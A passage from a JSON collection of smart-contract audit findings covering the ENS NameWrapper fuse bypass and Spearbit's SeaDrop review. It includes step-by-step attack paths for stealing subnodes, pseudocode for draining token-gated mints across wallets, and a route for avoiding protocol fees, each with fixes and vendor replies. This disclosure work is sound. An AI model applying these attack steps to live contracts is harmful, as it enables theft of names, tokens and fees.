hacker - *the ENS registry owner of `sub2.sub1.eth` is the NameWrapper contract.*\n\n3.  `sub3.sub2.sub1.eth` is created with no fuses burnt and owned by a victim user - *the ENS registry owner of `sub3.sub2.sub1.eth` is the NameWrapper contract.*\n\n4.  the hacker unwraps `sub2.sub1.eth` - *the ENS registry owner of `sub2.sub1.eth` becomes the hacker.*\n\n5.  via ENS registry, the hacker claims himself as the ENS registry owner of `sub3.sub2.sub1.eth`. Note that the `sub3.sub2.sub1.eth` in the NameWrapper contract remains valid till now - *the ENS registry owner of `sub3.sub2.sub1.eth` is the hacker.*\n\n6.  the hacker wraps `sub2.sub1.eth` - *the ENS registry owner of `sub2.sub1.eth` becomes the NameWrapper contract.*\n\n7.  the hacker burns the `PARENT_CANNOT_CONTROL` and `CANNOT_UNWRAP` fuses of `sub2.sub1.eth`.\n\n8.  the hacker burns the `PARENT_CANNOT_CONTROL`, `CANNOT_UNWRAP`, and `CANNOT_CREATE_SUBDOMAIN` fuses of `sub3.sub2.sub1.eth`. **Note that the current ENS registry owner of `sub3.sub2.sub1.eth` remains to be the hacker**\n\nAt this stage, things went wrong.\n\nAgain, currently the `sub3.sub2.sub1.eth` is valid in NameWrapper w/ `PARENT_CANNOT_CONTROL | CANNOT_UNWRAP | CANNOT_CREATE_SUBDOMAIN` burnt, but the ENS registry owner of `sub3.sub2.sub1.eth` is the hacker.\n\nThe hacker can:\n\n*   invoke `NameWrapper::wrap` to wrap `sub3.sub2.sub1.eth`, and re-claim himself as the owner of `sub3.sub2.sub1.eth` in NameWrapper.\n*   invoke `ENSRegistry::setSubnodeRecord` to create `sub4.sub3.sub2.sub1.eth` and wrap it accordingly, violating `CANNOT_CREATE_SUBDOMAIN`\n\n### Proof of Concept\n\nThe `poc_ens.js` file (included in [warden's original submission](https://github.com/code-423n4/2022-11-ens-findings/issues/14)) demonstrates the above hack, via 6 different attack paths.\n\nTo validate the PoC, put the file in `./test/wrapper` and run `npx hardhat test test/wrapper/poc_ens.js`\n\n### Recommended Mitigation Steps\n\nThe `NameWrapper.sol` file (included in [warden's original submission](https://github.com/code-423n4/2022-11-ens-findings/issues/14)) demonstrates the patch.\n\nIn short, we try to guarantee only fuses of **wrapped** nodes can be burnt.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-11-ens-findings/issues/14#issuecomment-1336603202):**\n > Will need to test POC but looks valid.\n\n**[jefflau (ENS) confirmed](https://github.com/code-423n4/2022-11-ens-findings/issues/14)**\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-11-ens-findings/issues/14#issuecomment-1343473105):**\n > The warden has shown how to sidestep fuses burned to effectively steal nodes.\n> Via wrapping, by leveraging a lack of checks, the warden was able to gain access to nodes which belong to other accounts.\n> \n> Because this finding:\n> - Shows broken invariants (sidestepped fuses)\n> - Was shown to allow stealing of child-nodes\n> \n> I agree with High Severity.\n\n**[izhuer (warden) commented](https://github.com/code-423n4/2022-11-ens-findings/issues/14#issuecomment-1343705974):**\n > Specifically, the PR proposed [here](https://github.com/ensdomains/ens-contracts/pull/159) looks good to me. It ensures that, if a given node has some fuses to burn, `ens.owner(node) == address(NameWrapper)` must be sanctified. \n> \n> However, I also observe that there is a new [PR](https://github.com/ensdomains/ens-contracts/pull/161) proposing a refactoring regarding `SetSubnodeOwner`. I may need to check this further since the logic seems to change quite a bit.  \n\n**[izhuer (warden) commented](https://github.com/code-423n4/2022-11-ens-findings/issues/14#issuecomment-1343845595):**\n > With regard to the test, maybe we can integrate the PoC (w/ slight modification) into test cases? So that it makes sure that any future refactoring would not break the security guarantee.\n\n**[izhuer (warden) commented](https://github.com/code-423n4/2022-11-ens-findings/issues/14#issuecomment-1344627513):**\n > Made some comments in the [refactoring RP](https://github.com/ensdomains/ens-contracts/pull/161). It seems not 100% safe and I may still need more time to review it. \n\n**[csanuragjain (warden) commented](https://github.com/code-423n4/2022-11-ens-findings/issues/14#issuecomment-1376912097):**\n > It is now ensured that child fuses can only be burned if node is wrapped ie ens.owner(node) == address(NameWrapper). \n> \n> ```\n> if (!isWrapped(node)) {\n>             ens.setSubnodeOwner(parentNode, labelhash, address(this));\n>             _wrap(node, name, owner, fuses, expiry);\n>         } else {\n>             _updateName(parentNode, node, label, owner, fuses, expiry);\n>         }\n> ```\n\n\n\n***\n\n",
      "summary": "\nA bug was discovered in the Ethereum Name Service (ENS) NameWrapper contract which allowed malicious owners of parent nodes to violate fuse constraints and gain control of subnodes. This bug was discovered by warden and judged to be of high severity. \n\nThe bug allowed malicious owners of parent nodes to reclaim ownership of a subnode even if the PARENT_CANNOT_CONTROL fuse of the subnode had been burnt. It also allowed them to create sub-subnodes even if the CANNOT_CREATE_SUBDOMAIN fuse of the subnode had been burnt. \n\nThe bug was demonstrated in a Proof of Concept (PoC) by warden which was validated by Alex the Entreprenerd and confirmed by jefflau. The PoC showed that the hacker could claim ownership of the subnode and create sub-subnodes in violation of the fuse constraints. \n\nThe bug was mitigated by a patch proposed by warden which ensured that only fuses of wrapped nodes could be burnt. This was later validated by izhuer who proposed integration of the PoC with slight modification into test cases to ensure that any future refactoring would not break the security guarantee. The patch was later confirmed by csanuragjain.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-11-ens",
      "github_link": "https://github.com/code-423n4/2022-11-ens-findings/issues/14",
      "tags": [],
      "finders": [
        "izhuer"
      ]
    },
    {
      "id": "6853",
      "title": "struct TokenGatedDropStage is expected to fit into 1 storage slot",
      "impact": "LOW",
      "content": "## Security Issue Report\n\n## Severity\n**Low Risk**\n\n## Context\n- **File:** SeaDropStructs.sol  \n- **Lines:** #L32-L61  \n- **File:** SeaDrop.sol  \n- **Lines:** #L871-L876  \n\n## Description\nThe `struct TokenGatedDropStage` is expected to be tightly packed into 1 storage slot, as announced in its @notice tag. However, the struct actually takes 2 slots. This is unexpected since only one slot is loaded in the `dropStageExists` assembly check.\n\n## Recommendation\nConsider changing `maxTokenSupplyForStage` from `uint40` to `uint32` to fit into 1 slot:\n\n```solidity\nstruct TokenGatedDropStage {\n    uint80 mintPrice; // 80/256 bits\n    uint16 maxTotalMintableByWallet;\n    uint48 startTime;\n    uint48 endTime;\n    uint8 dropStageIndex; // non-zero\n    - uint40 maxTokenSupplyForStage;\n    + uint32 maxTokenSupplyForStage;\n    uint16 feeBps;\n    bool restrictFeeRecipients;\n}\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "SeaDrop",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sawmon and Natalie",
        "Dravee",
        "Harikrishnan Mulackal"
      ]
    },
    {
      "id": "6852",
      "title": "Upgrade openzeppelin/contracts 's version",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\nSeaDrop.sol#L318\n\n## Description\nThere are known vulnerabilities in the current `@openzeppelin/contracts` version used. This affects SeaDrop.sol with a potential Improper Verification of Cryptographic Signature vulnerability as `ECDSA.recover` is used.\n\n## Recommendation\nConsider upgrading to `@openzeppelin/contracts@4.7.3`.\n\n## OpenSea\nFixed in commit d279548.\n\n## Spearbit\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "SeaDrop",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sawmon and Natalie",
        "Dravee",
        "Harikrishnan Mulackal"
      ]
    },
    {
      "id": "6851",
      "title": "Missing boundary checks on feeBps",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- ERC721SeaDrop.sol#L167\n- ERC721SeaDrop.sol#L192\n- ERC721SeaDrop.sol#L241\n- ERC721SeaDrop.sol#L272\n- SeaDrop.sol#L554-L557\n\n## Description\nThere's a missing check when setting `feeBps` from `ERC721SeaDrop.sol` while one exists when the value is used at a later stage in `SeaDrop.sol`, which could cause an `InvalidFeeBps` error.\n\n## Recommendation\nConsider adding the following checks before setting `feeBps` at the mentioned places in `ERC721SeaDrop.sol`:\n\n```solidity\n// Revert if the fee basis points is greater than 10_000.\nif (feeBps > 10_000) {\n    revert InvalidFeeBps(feeBps);\n}\n```\n\n## OpenSea\nThis has been added to `SeaDrop` itself on `updatePublicDrop` and `updateTokenGatedDrop`. See commit `246e1d4`.\n\n## Spearbit\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "SeaDrop",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sawmon and Natalie",
        "Dravee",
        "Harikrishnan Mulackal"
      ]
    },
    {
      "id": "6850",
      "title": "Missing address(0) check",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- SeaDrop.sol#L856\n- SeaDrop.sol#L907-L909\n- SeaDrop.sol#L927-L929\n- SeaDrop.sol#L966-L968\n- ERC721SeaDrop.sol#L245\n\n## Description\nAll update functions having an address as an argument check them against `address(0)`. This is missing in `updateTokenGatedDrop`. This is also not protected in `ERC721SeaDrop.sol#updateTokenGatedDrop()`, so `address(0)` could pass as a valid value.\n\n## Recommendation\nConsider adding `address(0)` checks for `allowedNftToken`.\n\n## OpenSea\nFixed in commit `13deff0`.\n\n## Spearbit\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "SeaDrop",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sawmon and Natalie",
        "Dravee",
        "Harikrishnan Mulackal"
      ]
    },
    {
      "id": "6849",
      "title": "Missing parameter in _SIGNED_MINT_TYPEHASH",
      "impact": "LOW",
      "content": "## Audit Report\n\n## Severity\n**Low Risk**\n\n## Context\n- `SeaDrop.sol#L78`\n- `lib/SeaDropStructs.sol#L92`\n\n## Description\nA parameter is missing (`uint256 maxTokenSupplyForStage`) and was caught after reformatting.\n\n## Recommendation\nReformat these lines into:\n\n```solidity\nbytes32 internal immutable _SIGNED_MINT_TYPEHASH =\nkeccak256(\n    \"SignedMint(\"\n    \"address nftContract,\"\n    \"address minter,\"\n    \"address feeRecipient,\"\n    \"MintParams mintParams\"\n    \")\"\n    \"MintParams(\"\n    \"uint256 mintPrice,\"\n    \"uint256 maxTotalMintableByWallet,\"\n    \"uint256 startTime,\"\n    \"uint256 endTime,\"\n    \"uint256 dropStageIndex,\"\n    \"uint256 maxTokenSupplyForStage,\" // <--- missing in the audit repo\n    \"uint256 feeBps,\"\n    \"bool restrictFeeRecipients\"\n    \")\"\n);\nbytes32 internal immutable _EIP_712_DOMAIN_TYPEHASH =\nkeccak256(\n    \"EIP712Domain(\"\n    \"string name,\"\n    \"string version,\"\n    \"uint256 chainId,\"\n    \"address verifyingContract\"\n    \")\"\n);\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "SeaDrop",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sawmon and Natalie",
        "Dravee",
        "Harikrishnan Mulackal"
      ]
    },
    {
      "id": "6848",
      "title": "Warn contracts implementing IERC721SeaDrop to revert on quantity == 0 case",
      "impact": "LOW",
      "content": "## Security Advisory\n\n**Severity:** Low Risk  \n**Context:** SeaDrop.sol#L620  \n\n## Description\nThere are no checks in SeaDrop that prevent minting in the case when `quantity == 0`. This would call the function `mintSeadrop(minter, quantity)` for a contract implementing `IERC721SeaDrop` with `quantity == 0`. It is up to the implementing contract to revert in such cases. The ERC721A library reverts when `quantity == 0`â€”the correct behavior.\n\nHowever, there have been instances in the past where ignoring `quantity == 0` checks have led to security issues.\n\n## Recommendation\nThere are two ways to fix this:\n\n1. SeaDrop reverts early when `quantity == 0`. This is never a valid input. As a reference, Seaport avoids any transfers of 0 amount. See `TokenTransferrerErrors.sol#L18`.\n2. Warn contracts implementing `IERC721SeaDrop` to revert on the `quantity == 0` case.\n\n## OpenSea\nWe have added error `MintQuantityCannotBeZero` to `_checkMintQuantity` in the commit `69f2854`.\n\n## Spearbit\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "SeaDrop",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sawmon and Natalie",
        "Dravee",
        "Harikrishnan Mulackal"
      ]
    },
    {
      "id": "6847",
      "title": "Update the ERC721A library due to an unpadded toString() function",
      "impact": "LOW",
      "content": "## Audit Report\n\n**Severity:** Low Risk  \n**Context:** \n- ERC721SeaDrop.sol#L14\n- chiru-labs/ERC721A/contracts/ERC721A.sol#L1049\n\n**Description:**  \nThe audit repository uses ERC721A at commit `atdca00fffdc8978ef517fa2bb6a5a776b544c002a`, which does not add a trailing zero padding to the returned string. Some projects have had issues reusing the `toString()` function where the off-chain call returned some dirty bits at the end (similar to Seaport 1.0's `name()`).\n\n**Recommendation:**  \nConsider upgrading to a version of ERC721A1 with that fix. Even then, testing it would be great.\n\n**References:**  \n- PR: Add trailing zeros padding to `_toString`  \n- OpenSea: Fixed in commit `8441e94`.  \n- Spearbit: Acknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "SeaDrop",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sawmon and Natalie",
        "Dravee",
        "Harikrishnan Mulackal"
      ]
    },
    {
      "id": "6846",
      "title": "Update the start token id for ERC721SeaDrop to1",
      "impact": "LOW",
      "content": "## Issue Report\n\n## Severity\n**Low Risk**\n\n## Context\n`ERC721SeaDrop.sol#L144`\n\n## Description\nThe `ERC721SeaDrop` contract's `smintSeaDrop` function uses `fromERC721A` library, which starts the token IDs for minting from `0`.\n\n```solidity\n/// contracts/ERC721A.sol#L154-L156\n/**\n * @dev Returns the starting token ID.\n * To change the starting token ID, please override this function.\n */\nfunction _startTokenId() internal view virtual returns (uint256) {\n    return 0;\n}\n```\n\n## Recommendation\nUsing `0` can signal values that have not been set or have been removed. To avoid possible future problems, consider using a different starting token ID by overriding the `_startTokenId` function in `ERC721SeaDrop`. \n\n## OpenSea\nWe can configure it to start at `1` as a quality of life improvement.\n\n## Fixed in Commit\n`e14fa17`\n\n## Spearbit\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "SeaDrop",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sawmon and Natalie",
        "Dravee",
        "Harikrishnan Mulackal"
      ]
    },
    {
      "id": "6845",
      "title": "owner can reset feeBps set byadmin for token gated drops",
      "impact": "MEDIUM",
      "content": "## Medium Risk Report\n\n**Severity:** Medium Risk  \n**Context:** \n- ERC721SeaDrop.sol#L233-L245\n- SeaDrop.sol#L860\n- SeaDrop.sol#L889-L890  \n\n**Description:**  \nOnly the admin can call `updateTokenGatedDropFee` to update `feeBps`. However, the owner can call `updateTokenGatedDrop(address seaDropImpl, address allowedNftToken, TokenGatedDropStage calldata dropStage)` twice afterward to reset the `feeBps` to 0 for a drop.\n\n1. Once with `dropStage.maxTotalMintableByWallet` equal to 0 to wipe out the storage on the SeaDrop side.\n2. Then with the same `allowedNftToken` address and the other desired parameters, which would retrieve the previously wiped out drop stage data (with `feeBps` equal to 0).\n\n**NOTE:** This type of attack does not apply to `updatePublicDrop` and `updatePublicDropFee` pair, since `updatePublicDrop` cannot remove or update the `feeBps`. Once `updatePublicDropFee` is called with a specific `feeBps`, that value remains for this ERC721SeaDrop contract-related storage on SeaDrop (`_publicDrops[msg.sender] = publicDrop`). Any number of consecutive calls to `updatePublicDrop` with any parameters cannot change the already set `feeBps`.\n\n**Recommendation:**  \nThe admins could monitor all activities for `updateTokenGatedDrop` calls even when the same old `allowedNftToken` is used and make sure to set the fees after each call if it is not a removal kind.\n\n**OpenSea Proposal:**  \nWe can rework it so that `updateTokenGatedDropFee` \"initializes\" a TokenGatedDrop stage (setting all params to 0 besides `feeBps` and `restrictFeeRecipients`), allowing a partner to then edit other params and delete the stage, but not create a new one. This would be a workaround for the current issues.\n\n## Proposed Workaround:\n- Administrator/OpenSea is the only authorized user that can \"initialize\" a TokenGatedDrop. Initializing a token-gated drop sets all params to zero except `maxTotalMintableByWallet = 1` (the struct will not be stored if == 0), `feeBps`, and `restrictFeeRecipients = true`.\n- The parameter `startTime = 0` means the stage will not be active and cannot be made active by OpenSea.\n- The Owner/Partner can then update the initialized TokenGatedDrop stage (potentially including delete, if so desired, but it would need to be re-initialized with a fee by OpenSea).",
      "summary": "\nThis bug report is about the ERC721SeaDrop.sol and SeaDrop.sol contracts. There is a vulnerability in these contracts which allows the owner to call the updateTokenGatedDrop function twice in order to reset the feeBps to 0 for a drop. This vulnerability does not apply to the updatePublicDrop and updatePublicDropFee pair.\n\nThe severity of the issue is medium risk. The recommendation is that administrators should monitor all activities for updateTokenGatedDrop calls even when the same old allowedNftToken is used and make sure to set the fees after each call if it is not a removal kind.\n\nA proposed workaround is that the administrator/OpenSea is the only authorized user that can \"initialize\" a TokenGatedDrop. This sets the parameters to zero except maxTotalMintableByWallet = 1, feeBps, and restrictFeeRecipients = true. The Owner/Partner can then update the initialized TokenGatedDrop stage, which includes the possibility of deleting it. However, it would need to be re-initialized with a fee by OpenSea.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "SeaDrop",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Admin",
        "Access Control"
      ],
      "finders": [
        "Sawmon and Natalie",
        "Dravee",
        "Harikrishnan Mulackal"
      ]
    },
    {
      "id": "6844",
      "title": "ERC721SeaDrop 'sadmin would need to set feeBps manually after/before creation of each drop by the owner",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\n- `ERC721SeaDrop.sol#L180`\n- `ERC721SeaDrop.sol#L256`\n\n## Description\nWhen an owner of an `ERC721SeaDrop` token creates either a public or a token gated drop by calling `updatePublicDrop` or `updateTokenGatedDrop`, the `PublicDrop.feeBps` / `TokenGatedDropStage.feeBps` is initially set to 0. So the admin would need to set the `feeBps` parameter at some point (before or after). Forgetting to set this parameter results in not receiving the protocol fees.\n\n## Recommendation\nThere are multiple ways to mitigate this:\n\n1. The admin monitors the activities on-chain and if it sees a newly created drop, calls either `updatePublicDropFee` or `updateTokenGatedDropFee` (depending on the type of the drop) to set the `feeBps`.\n   \n2. Enforcing that both `updatePublicDrop` and `updatePublicDropFee` (or `updateTokenGatedDrop` and `updateTokenGatedDropFee`) be called by the owner and the admin before a drop can start. The enforcement can be either on the `ERC721SeaDrop` side or on the `SeaDrop` side. Also, there could be a flag set by the admin to waive the protocol fee.",
      "summary": "\nThis bug report is about a problem with the ERC721SeaDrop.sol contract. When an owner creates either a public or token gated drop, the PublicDrop.feeBps/TokenGatedDropStage.feeBps parameter is initially set to 0. This means that the admin would need to set the feeBps parameter before the drop can start. If this is not done, the protocol fees will not be received. \n\nTo mitigate this, the admin can monitor the activities on-chain and call either updatePublicDropFee or updateTokenGatedDropFee to set the feeBps. Alternatively, the admin can enforce that both updatePublicDrop and updatePublicDropFee (or updateTokenGatedDrop and updateTokenGatedDropFee) be called before a drop can start. Finally, the admin can set a flag to waive the protocol fee.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "SeaDrop",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Update State After Admin Action"
      ],
      "finders": [
        "Sawmon and Natalie",
        "Dravee",
        "Harikrishnan Mulackal"
      ]
    },
    {
      "id": "6843",
      "title": "ERC721SeaDrop owner can choose an address they control as the admin when the constructor is called.",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\n`ERC721SeaDrop.sol#L83`\n\n## Description\nThe owner/creator can call the contract directly (skipping the use of the UI) and set the administrator as themselves or another address that they control. After creating a `PublicDrop` or `TokenGatedDrop`, they can call either `updatePublicDropFee` or `updateTokenGatedDropFee` and set the `feeBps` to:\n- zero\n- another number \n\nThey can also call `updateAllowedFeeRecipient` to add the same or another address they control as a `feeRecipient`. This way, they can circumvent the protocol fee.\n\n## Recommendation\nConsider implementing the following suggestions:\n- Do not list NFT contracts on the marketplace site that have an administrator who is not on an internal allowed list.\n- Allow each permitted SeaDrop implementation's admin/operator to set the admins for the `ERC721SeaDrop` contract. However, this could still potentially be rigged by a custom handcrafted contract that pretends to be an `ERC721SeaDrop` contract.\n- SeaDrop can have its own set of admins independent of the `IERC721SeaDrop` tokens. These admins should be able to set the `feeRecipients` and `feeBps` on SeaDrop without interacting with the original token.\n\n## OpenSea\nIn practice, this particular implementation will be deployed by OpenSea or a trusted partner. Generally, an administrator is not required for `ERC721SeaDrop` contracts; OpenSea will ingest events and data, then selectively decide which mints to surface and fulfill, depending on mint parameters. In other words, it's up to an individual marketplace to decide which mints they are willing to list and fulfill, with that decision making happening off-chain.\n\n## Spearbit\nI guess the listing and fulfillment on the OpenSea side is just about the OpenSea marketplace UI. For example, other aggregators that listen to events from OpenSea-deployed SeaDrops can/could list these `ERC721SeaDrop` on their marketplace. Obviously, users can still interact with the OpenSea-deployed SeaDrops directly.",
      "summary": "\nThis bug report is about an issue with the ERC721SeaDrop.sol contract on line 83. It states that the owner/creator can call the contract directly and set the administrator as themselves or another address they can control. This would allow them to circumvent the protocol fee by setting the feeBps to zero or another number and also call the updateAllowedFeeRecipient to add the same or another address they control as a feeRecipient. \n\nThe report offers some recommendations to address the issue. One is not to list NFT contracts on the marketplace site that have an administrator who is not in an internal allowed list. Another is to let each allowed SeaDrop implementation's admin/operator to set the admins for the ERC721SeaDrop contract. Additionally, SeaDrop can have its own set of admins independent of the IERC721SeaDrop tokens. Finally, it is up to the individual marketplace to decide which mints they are willing to list and fulfill, and that decision making happens off-chain. \n\nIn conclusion, this bug report is about an issue with the ERC721SeaDrop.sol contract on line 83 that allows the owner/creator to circumvent the protocol fee. The report offers some recommendations to address the issue.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "SeaDrop",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Validation",
        "Admin"
      ],
      "finders": [
        "Sawmon and Natalie",
        "Dravee",
        "Harikrishnan Mulackal"
      ]
    },
    {
      "id": "6842",
      "title": "ERC721A has mint caps that are not checked by ERC721SeaDrop",
      "impact": "MEDIUM",
      "content": "## Medium Risk Severity Report\n\n## Context\n`ERC721SeaDrop.sol#L137-L145`\n\n## Description\n`ERC721SeaDrop` inherits from `ERC721A`, which packs `balance`, `numberMinted`, `numberBurned`, and an extra data chunk into one storage slot (64 bits per sub-storage) for every address. This creates an inherent cap of \\( 2^{64} - 1 \\) on all these different fields. Currently, there is no check in `ERC721A`'s `_mint` for quantity nor in `ERC721SeaDrop`'s `mintSeaDrop` function.\n\nAdditionally, if an owner is close to reaching the maximum cap for their balance and someone else transfers a token to this owner, an overflow may occur for the balance and possibly the number of mints in `_packedAddressData`. This overflow could potentially reduce the balance and the `numberMinted` to a much lower number, while `numberBurned` could be increased to a much higher number.\n\n## Recommendation\nWe should implement an additional check to verify if the quantity would exceed the mint cap in `mintSeaDrop`.\n\n## OpenSea\nWe will add checks regarding the `ERC721A` limits. A restraint has been implemented where `maxSupply` cannot be set greater than \\( 2^{64} - 1 \\) so that neither balance nor number minted can exceed this limit. See the commit `5a98d29`.",
      "summary": "\nThis bug report is regarding ERC721SeaDrop.sol, which is a smart contract that inherits from ERC721A. The issue is that this smart contract can potentially reach a maximum capacity of 264-1 for all fields, such as balance, numberMinted, and numberBurned. If the maximum capacity is reached for a balance and someone else transfers a token, the balance can overflow, reducing the balance and numberMinted to a much lower number, and increasing the numberBurned to a much higher number. \n\nTo remedy this issue, it is recommended to add an additional check in the mintSeaDrop function that would check if the quantity would exceed the mint cap. OpenSea has taken action and added a restraint that maxSupply cannot be set to greater than 264-1, so balance nor number minted can exceed this. This was done via the commit 5a98d29.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "SeaDrop",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Min/Max Cap Validation",
        "Business Logic"
      ],
      "finders": [
        "Sawmon and Natalie",
        "Dravee",
        "Harikrishnan Mulackal"
      ]
    },
    {
      "id": "6841",
      "title": "Token gated drops with a self-allowed ERC721SeaDrop or a variant of that can lead to the drop getting drained by one person.",
      "impact": "MEDIUM",
      "content": "## Token Gated Drop Vulnerability Analysis\n\n## Severity: Medium Risk\n\n**Context:** `SeaDrop.sol#L345`\n\n### Description\nThere are scenarios where an actor with only 1 token from an allowed NFT can drain Token Gated Drops that are happening simultaneously or back to back.\n\n#### Scenario 1 - Self-Registration of ERC721SeaDrop\nIn this scenario, an `ERC721SeaDrop` is registered as an `allowedNftToken` for itself. \n\nThis is a simple example where an `ERC721SeaDrop` N is registered by the owner or the admin as an `allowedNftToken` for its own token gated drop. During or before this drop (let's call this drop D), there is another token gated drop (D0) for another `allowedNftToken` N0, which does not need to be necessarily an `IERC721SeaDrop` token. \n\n**Here is how an actor can drain the self-registered token gated drop:**\n1. The actor already owns or buys an N0 token `t0` with wallet `w0`.\n2. During D0, the actor mints an N token `t0` with wallet `w0`, passing `N0, t0` to `mintAllowedTokenHolder` and transfers `t0` to another wallet if necessary to avoid the max mint per wallet limit (call this wallet `w1`, which could still be `w0`).\n3. Once D starts or if it is already started, the actor mints another N token `t1` with `w1`, passing `N, t0` to `mintAllowedTokenHolder` and transfers `t1` to another wallet if necessary to avoid the max mint per wallet limit (call this wallet `w2`, which could still be `w1`).\n4. Repeat step 3 with the new parameters until we hit the `maxTokenSupplyForStage` limit for D.\n\n```solidity\n## during token gated drop D\nt = seaDrop.mintAllowedTokenHolder(N, f, w, {N, [t]})\n\n## during token gated drop D\nwhile (have not reached maxTokenSupplyForStage):\n    if (w has reached max token per wallet):\n        w' = newWallet()\n    N.transfer(w, w', t)\n    w = w'\n    t = seaDrop.mintAllowedTokenHolder(N, f, w, {N, [t]})\n```\n\n#### Scenario 2 - Simultaneous Token Gated Drops\nIn this scenario, there are 2 `ERC721SeaDrop` tokens N1 and N2 where they are running simultaneous token gated drop promotions. Each is allowing a wallet/bag holder from the other token to mint a token from their project. \n\nIf you have an N1 token, you can mint an N2 token and vice versa. Now if an actor already has an N1 or N2 token, maybe from another token gated drop or from an allow list mint, they can drain these 2 drops until one of them hits the `maxTokenSupplyForStage` limit.\n\n```solidity\n## wallet <w> already holds token <t> from N1\nwhile (have not reached N1.maxTokenSupplyForStage or N2.maxTokenSupplyForStage):\n    w = newWalletIfMaxMintReached(N1, w, t) # this also transfers t to the new wallet\n    w = newWalletIfMaxMintReached(N2, w, t) # this also transfers t to the new wallet\n    t = seaDrop.mintAllowedTokenHolder(N2, f, w, {N1, [t]})\n    t = seaDrop.mintAllowedTokenHolder(N1, f, w, {N2, [t]})\n```\nThis scenario can be extended to more complex systems, but the core logic remains the same. \n\nIt's important to note that generally, `maxTotalMintableByWallet` for token gated drops and `maxMintsPerWallet` for public mints are not fully enforceable since actors can either distribute their allowed tokens between multiple wallets to mint to their full potential for the token gated drops. For public mints, they would use different wallets. It does add extra gas for them to mint since they can't batch mint. That said, these limits are enforceable for the signed and allowed mints (or you could say the enforcing has been moved to some off-chain mechanism).\n\n### Recommendations\n\n1. **OpenSea:** In scenario 1, a check against allowing a token to register itself as an allowed token-gated drop is reasonable.\n2. In scenario 2, we could also check against allowing a token to register a second token as an allowed-token-gated drop if that token's `currentSupply < maxSupply` and has the first token registered as its own token-gated drop. \n   \n   *This has the caveat that a token could implement itself to have a changeable maxSupply, which would bypass these checks... open to other implementation ideas.*\n\nI think both cases should be documented in the comments.\n\n3. **Spearbit:** Agree with OpenSea regarding a check for a self-allowed token gated drop in scenario 1.\n\nFor scenario 2 or a more complex variant of it, like:\n```\n// N1, N2: IERC721SeaDrop tokens with token gated drop promotions\n// Each arrow in the diagram below represents an allowed mint mechanism\n// A -> B: a person with a t_a token from A can mint a token of B (B can potentially mark t_a as redeemed on mint)\nM0 -> N1 -> M1 -> M2 -> ... -> Mk -> N2 -> O1 -> O2 -> ... -> Oj -> N1\n```\nIt would be difficult to implement checks that catch such behaviors, but documentation of these scenarios in the comments would be beneficial.\n\n**OpenSea:** Added error 